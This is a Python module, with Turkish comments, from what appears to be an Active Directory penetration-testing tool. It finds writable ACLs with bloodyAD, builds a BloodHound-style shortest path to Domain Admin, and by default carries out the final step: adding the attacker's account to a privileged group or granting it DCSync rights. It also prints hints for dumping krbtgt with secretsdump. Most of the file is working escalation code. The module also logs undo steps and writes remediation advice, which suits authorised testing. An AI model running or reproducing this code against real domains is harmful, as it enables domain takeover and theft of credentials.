"""ACL kısa-yol motoru: tekil ACL kenarlarını DA'ya giden bir YOLA bağlar.

Her kontrol ettiğimiz kimlik için `bloodyAD get writable --detail` çalıştırıp
çıkan yazma haklarını **kenarlara** (edge) çevirir:

    control_user  : bir kullanıcıyı ele geçirebilme (GenericWrite/All, SPN, keycred…)
    addmember     : bir GRUBA üye ekleyebilme (member yazma)
    dcsync        : domain NC başında WriteDacl/GenericAll -> DCSync verebilme
    rbcd          : bir bilgisayara RBCD yazabilme
    shadow        : msDS-KeyCredentialLink yazabilme
    reanimate     : silinmiş nesneyi geri canlandırabilme

Sonra BFS ile kontrol edilen kimliklerden **yüksek değerli hedeflere**
(Domain/Enterprise Admins, DA üyesi kullanıcı, domain kökü = DCSync) en kısa
yolu bulur; `exploit=True` ise kazanç kenarını (gruba kendini ekle / DCSync hakkı
ver) yürütür. Signed-LDAP ile çalışır (bloodhound-python'un takıldığı yerde).
"""

from __future__ import annotations

import re
from collections import deque
from dataclasses import dataclass

from . import cleanup
from .findings import Credential, Finding, ScanReport, Severity
from .modules import bloodyAD_scan
from .registry import ScanContext
from .runner import run

# Yüksek değerli (kazanç) grup adları — DN'de geçerse hedef
_PRIV_GROUP_RX = re.compile(
    r"domain admins|enterprise admins|^cn=administrators|schema admins|"
    r"group policy creator|key admins|account operators|backup operators",
    re.IGNORECASE,
)

# Kenar türü -> okunur etiket
KIND_LABEL = {
    "control_user": "GenericWrite→kullanıcı",
    "addmember": "AddMember→grup",
    "dcsync": "WriteDacl→DCSync",
    "rbcd": "RBCD→bilgisayar",
    "shadow": "ShadowCreds",
    "reanimate": "Reanimation",
    "write": "Write",
}
# Ele geçen düğümün KONTROLÜNÜ veren (traversal) kenarlar
_TRAVERSAL = {"control_user", "reanimate", "rbcd", "shadow"}


@dataclass(frozen=True)
class Edge:
    src: str          # kaynak principal (küçük harf ad)
    dst: str          # hedef düğüm (küçük harf ad)
    dst_dn: str       # hedef nesnenin DN'i
    kind: str         # control_user/addmember/dcsync/rbcd/shadow/reanimate/write
    highvalue: bool   # hedef yüksek değerli mi (privileged grup / domain)

    def label(self) -> str:
        return KIND_LABEL.get(self.kind, self.kind)


def _node(dn: str) -> str:
    """DN'den kısa düğüm adı çıkarır (CN/OU)."""
    if dn.lower().startswith("dc="):
        return "domain"
    m = re.match(r"(?:CN|OU)=([^,\\]+)", dn, re.IGNORECASE)
    return (m.group(1).strip().lower() if m else dn.strip().lower())


def _is_domain_root(dn: str) -> bool:
    return dn.lower().startswith("dc=")


def classify(dn: str, right_keys: set[str]) -> str:
    """Yazılabilir bir nesne + hakları -> kenar türü."""
    if bloodyAD_scan._DELETED_RX.search(dn):
        return "reanimate"
    if "member" in right_keys:
        return "addmember"
    if "msds-allowedtoactonbehalfofotheridentity" in right_keys:
        return "rbcd"
    if "msds-keycredentiallink" in right_keys:
        return "shadow"
    if _is_domain_root(dn) and (right_keys & {"dacl", "ntsecuritydescriptor",
                                              "writedacl", "genericall", "owner"}):
        return "dcsync"
    if right_keys & {"serviceprincipalname", "unicodepwd", "userpassword",
                     "unixuserpassword", "useraccountcontrol", "scriptpath",
                     "genericall", "dacl", "writedacl", "writeowner", "owner"}:
        return "control_user"
    return "write"


def is_highvalue(dn: str) -> bool:
    return bool(_PRIV_GROUP_RX.search(dn)) or _is_domain_root(dn)


def _is_win(edge: Edge, hv_users: set[str]) -> bool:
    """Bu kenar doğrudan DA'ya ulaştırır mı?"""
    if edge.kind == "addmember" and edge.highvalue:
        return True          # privileged gruba kendini ekle
    if edge.kind == "dcsync":
        return True          # DCSync hakkı -> krbtgt
    if edge.kind in _TRAVERSAL and edge.dst in hv_users:
        return True          # DA üyesi bir kullanıcıyı ele geçir
    return False


def shortest_path(graph: dict[str, list[Edge]], controlled: set[str],
                  hv_users: set[str]) -> list[Edge] | None:
    """Kontrol edilen düğümlerden DA kazancına en kısa kenar dizisini (BFS) döndürür."""
    visited = set(controlled)
    queue: deque[tuple[str, list[Edge]]] = deque((n, []) for n in controlled)
    while queue:
        node, path = queue.popleft()
        for edge in graph.get(node, []):
            if _is_win(edge, hv_users):
                return path + [edge]
            if edge.kind in _TRAVERSAL and edge.dst not in visited:
                visited.add(edge.dst)
                queue.append((edge.dst, path + [edge]))
    return None


# ---------------------------------------------------------------------------
# Canlı: kenar keşfi + analiz + (opsiyonel) yürütme
# ---------------------------------------------------------------------------

def _argv_for(ctx: ScanContext, cred: Credential, *rest: str,
              secure: bool = False, json_out: bool = False) -> list[str]:
    pwd = cred.secret if cred.kind == "password" else None
    nth = cred.secret if cred.kind == "nthash" else None
    return bloodyAD_scan._base_argv(ctx.target, ctx.domain or cred.domain,
                                    cred.username, pwd, nth, json_out=json_out,
                                    secure=secure,
                                    use_kerberos=ctx.use_kerberos) + list(rest)


def discover_edges(ctx: ScanContext, cred: Credential) -> list[Edge]:
    """Bir kimlik olarak get writable çalıştırır, yazma haklarını kenarlara çevirir.

    `--json` ile güvenilir ayrıştırma; DC signing/CB zorunluysa LDAPS (`-s`) ile
    otomatik tekrar — böylece sertleştirilmiş DC'lerde de eksiksiz sonuç alınır.
    """
    res = run(_argv_for(ctx, cred, "get", "writable", "--detail", json_out=True),
              tool=f"aclgraph:writable:{cred.username}", timeout=ctx.timeout,
              dry_run=ctx.dry_run)
    if not ctx.dry_run and bloodyAD_scan._needs_secure(res):
        res = run(_argv_for(ctx, cred, "get", "writable", "--detail",
                            secure=True, json_out=True),
                  tool=f"aclgraph:writable:{cred.username}", timeout=ctx.timeout,
                  dry_run=ctx.dry_run)
    if not res.ok:
        return []
    src = cred.username.lower()
    edges: list[Edge] = []
    for rec in bloodyAD_scan._records_of(res):
        dn = (rec.get("distinguishedname") or [""])[0].strip()
        if not dn:
            continue
        keys = {k for k in rec if k != "distinguishedname"}
        # değerlerde de WRITE/DACL geçebilir; anahtar kümesi haklar için yeterli
        kind = classify(dn, keys)
        edges.append(Edge(src=src, dst=_node(dn), dst_dn=dn, kind=kind,
                          highvalue=is_highvalue(dn)))
    return edges


def _privileged_users(ctx: ScanContext, cred: Credential) -> set[str]:
    """Domain/Enterprise Admins üyelerini (yüksek değerli kullanıcılar) toplar."""
    names: set[str] = set()
    for g in ("Domain Admins", "Enterprise Admins", "Administrators"):
        res = run(_argv_for(ctx, cred, "get", "object", g, "--attr", "member",
                            json_out=True),
                  tool=f"aclgraph:members:{g}", timeout=ctx.timeout, dry_run=ctx.dry_run)
        if res.ok:
            # JSON/düz-metin fark etmez: üye DN'lerinin ilk CN'i = hesap adı
            for rec in bloodyAD_scan._records_of(res):
                for dn in rec.get("member", []):
                    m = re.match(r"CN=([^,\\]+)", dn)
                    if m:
                        names.add(m.group(1).strip().lower())
    return names


def _say(ui, text: str) -> None:
    if ui is not None:
        ui.log(text)
    else:
        print(text)


def _mark(sym: str, ui) -> str:
    return f"\033[1;32m{sym}\033[0m" if getattr(ui, "color", False) else sym


def analyze(ctx: ScanContext, report: ScanReport, *, ui=None,
            exploit: bool = True) -> list[Edge] | None:
    """ACL grafiğini kurar, DA'ya yolu bulur, raporlar; exploit ise kazanç kenarını yürütür."""
    creds = [c for c in report.credentials if c.secret]
    if not creds:
        _say(ui, "  (aclgraph: kimlik yok — ACL yol analizi atlandı)")
        return None

    hv_users = _privileged_users(ctx, creds[0])
    graph: dict[str, list[Edge]] = {}
    controlled = {c.username.lower() for c in creds}
    for c in creds:
        for e in discover_edges(ctx, c):
            graph.setdefault(e.src, []).append(e)

    path = shortest_path(graph, controlled, hv_users)

    if path:
        steps = _format_path(path)
        _say(ui, f"  {_mark('⇒', ui)} ACL yolu (DA'ya): {steps}")
        report.add(Finding(
            title=f"ACL kısa-yol: Domain Admin'e {len(path)} adımda ulaşılabilir",
            severity=Severity.CRITICAL, target=ctx.target, source="aclgraph",
            description="Kontrol edilen kimlik(ler)den Domain Admin'e giden bir ACL "
                        "zinciri bulundu. Her ok bir yetki-devri kenarıdır.",
            evidence=steps,
            remediation="Zincirdeki aşırı ACL'leri (WriteDacl/GenericAll/AddMember/RBCD) "
                        "kaldırın; ayrıcalıklı gruplara yazma haklarını denetleyin.",
            reference="ACL abuse path (BloodHound 'shortest path' muadili)",
            poc="bloodyAD --host <dc> -d <domain> -u <user> -p <pass> get writable --detail",
            escalation=_walk_hint(path[-1])))
        if exploit and not ctx.dry_run:
            _walk(ctx, report, creds, path[-1], ui)
    else:
        _say(ui, "  (aclgraph: kontrol edilen kimliklerden doğrudan AD-içi DA yolu yok)")
    return path


def _format_path(path: list[Edge]) -> str:
    if not path:
        return ""
    out = path[0].src
    for e in path:
        out += f"  --[{e.label()}]-->  {e.dst}"
    return out


def _walk_hint(win: Edge) -> str:
    if win.kind == "addmember":
        return f"bloodyAD ... add groupMember '{win.dst}' <sizin_user>  (privileged gruba ekle)"
    if win.kind == "dcsync":
        return "bloodyAD ... add dcsync <sizin_user>  ->  secretsdump.py -just-dc (krbtgt)"
    return f"Hedef kullanıcıyı ({win.dst}) shadow creds / targeted kerberoast ile ele geçir."


def _cred_for(creds: list[Credential], name: str) -> Credential | None:
    for c in creds:
        if c.username.lower() == name:
            return c
    return creds[0] if creds else None


def _walk(ctx: ScanContext, report: ScanReport, creds: list[Credential],
          win: Edge, ui) -> None:
    """Kazanç kenarını yürütür (yalnızca gruba-ekle ve DCSync-hakkı; onaylı akış)."""
    actor = _cred_for(creds, win.src)
    if actor is None:
        return
    me = f"{actor.domain}\\{actor.username}" if actor.domain else actor.username
    if win.kind == "addmember":
        res = run(_argv_for(ctx, actor, "add", "groupMember", win.dst_dn, actor.username),
                  tool="aclgraph:addmember", timeout=ctx.timeout)
        ok = res.ok and ("added" in res.combined.lower() or "success" in res.combined.lower())
        if ok:
            # Temizlik: üyelik otomatik geri alınabilir (del groupMember).
            cleanup.record(
                "group-member", ctx.target, f"{actor.username} ∈ {win.dst}",
                f"'{actor.username}' ayrıcalıklı '{win.dst}' grubuna eklendi.",
                module="aclgraph",
                undo_argv=_argv_for(ctx, actor, "del", "groupMember",
                                    win.dst_dn, actor.username))
            _say(ui, f"    {_mark('+', ui)} {actor.username} -> '{win.dst}' grubuna eklendi")
            if _PRIV_GROUP_RX.search(win.dst_dn) and "admin" in win.dst.lower():
                report.domain_admin = True
                report.add(Finding(
                    title=f"DOMAIN ADMIN: {actor.username} '{win.dst}' grubuna eklendi",
                    severity=Severity.CRITICAL, target=ctx.target, source="aclgraph",
                    description="ACL zinciri yürütüldü; ayrıcalıklı gruba üyelik kazanıldı.",
                    evidence=f"{me} ∈ {win.dst_dn}",
                    reference="Account Manipulation (AddMember)", mitre="T1098"))
        else:
            _say(ui, f"    ✘ gruba ekleme başarısız ({res.error or 'yetki?'})")
    elif win.kind == "dcsync":
        res = run(_argv_for(ctx, actor, "add", "dcsync", actor.username),
                  tool="aclgraph:dcsync-grant", timeout=ctx.timeout)
        ok = res.ok and ("success" in res.combined.lower() or "added" in res.combined.lower()
                         or res.returncode == 0)
        if ok:
            # Temizlik: verilen DCSync hakkı otomatik geri alınabilir (remove dcsync).
            cleanup.record(
                "dcsync-grant", ctx.target, actor.username,
                f"'{actor.username}' hesabına domain NC üzerinde DCSync hakkı verildi.",
                module="aclgraph",
                undo_argv=_argv_for(ctx, actor, "remove", "dcsync", actor.username))
            _say(ui, f"    {_mark('+', ui)} {actor.username} için DCSync hakkı verildi "
                     f"— escalate DCSync ile krbtgt düşürebilir")
            report.add(Finding(
                title=f"DCSync hakkı kazanıldı: {actor.username}",
                severity=Severity.CRITICAL, target=ctx.target, source="aclgraph",
                description="Domain NC üzerinde WriteDacl suistimali ile DCSync hakkı verildi.",
                evidence=f"grant DS-Replication-Get-Changes* -> {me}",
                reference="DCSync (WriteDacl abuse)", mitre="T1003.006"))
        else:
            _say(ui, f"    ✘ DCSync hakkı verilemedi ({res.error or 'yetki?'})")
